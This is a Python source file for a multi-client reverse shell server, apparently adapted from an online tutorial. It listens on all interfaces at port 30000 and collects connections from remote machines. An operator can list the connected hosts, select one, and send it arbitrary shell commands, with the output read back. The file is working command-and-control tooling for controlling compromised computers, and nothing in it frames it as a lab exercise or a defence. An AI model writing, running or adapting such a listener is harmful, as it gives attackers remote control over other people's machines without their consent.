from email.headerregistry import Address
import socket
import threading
import multiprocessing as mp
from queue import Queue

# Most of this code ripped from https://www.thepythoncode.com/article/create-reverse-shell-python
# with edits to support concurrency. Great thanks to https://github.com/strankid/Reverse-Shell/blob/master/server_multi.py for that

THREADS = 2
JOB_NUMBER = [1,2]
HOST = "0.0.0.0"
PORT = 30000
BUFF = 1024 * 512

queue = Queue()

all_connections = []
all_addresses = []


prompt = "$ "



def socket_create():
    global s
    s = socket.socket()

def socket_bind():
    global s
    s.bind((HOST, PORT))
    s.listen(5)

def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        conn, addr = s.accept()
        conn.setblocking(True)
        all_connections.append(conn)
        all_addresses.append(addr)
        print(f"Connection established to {addr[0]}")

def list_connections():
    for i in range(0,len(all_connections)):
        print(f"{i}:  {all_addresses[i]}")
def select(target):
    conn = all_connections[target]
    print("Connected to " + all_addresses[target][0])
    return conn
def send_commands(conn):
    while True:
        cmd = input(prompt)
        if len(cmd) > 0:
            conn.send(cmd.encode())
            if(cmd.split()[0] != "cd"):
                print(conn.recv(BUFF).decode())
        if cmd == "quit":
            break
def start_conn():
    while True:
        cmd = input("Enter connection, or list to list connections: ")
        if cmd == 'list':
            list_connections()
        if cmd.split()[0] == 'select':
            conn = select(int(cmd.split()[1]))
            send_commands(conn)

def create_workers():
    for _ in range(THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_conn()
        queue.task_done()
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

create_workers()
create_jobs()
